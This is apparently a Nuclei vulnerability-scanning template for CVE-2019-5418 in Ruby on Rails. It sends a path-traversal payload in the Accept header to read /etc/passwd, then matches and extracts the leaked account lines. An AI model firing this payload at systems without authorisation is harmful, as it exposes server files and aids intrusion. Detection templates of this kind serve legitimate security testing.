id: CVE-2019-5418

info:
  name: Ruby on Rails File Content Disclosure
  author: Kaimi
  severity: critical
  description: |
    Detects Ruby on Rails vulnerability allowing arbitrary file disclosure through
    specially crafted Accept headers. Affects versions <5.2.2.1, <5.1.6.2, <5.0.7.2, and <4.2.11.1.
  reference:
    - https://github.com/kaimi-/kaimi-nuclei-templates
    - https://nvd.nist.gov/vuln/detail/CVE-2019-5418
    - https://github.com/mpgn/CVE-2019-5418
  tags: cve,cve-2019-5418,ruby,rails,file-disclosure

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/oEmWzzKtXnjLsTcF"  # Random non-existent path

    headers:
      Accept: ../../../../../../etc/passwd{{

    matchers:
      - type: regex
        regex:
          - 'root:x:\d+:\d+:[^:]*:[^:]*:'
          - '/usr/sbin/nologin'
        condition: or
        part: body

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: leaked-data
        regex:
          - '(root:.*?\n)'
          - '(\w+:\d+:\d+:.*?:\/.*?:\/usr\/sbin\/nologin)'
        group: 1
        part: body

    max-redirects: 3
    matchers-condition: and
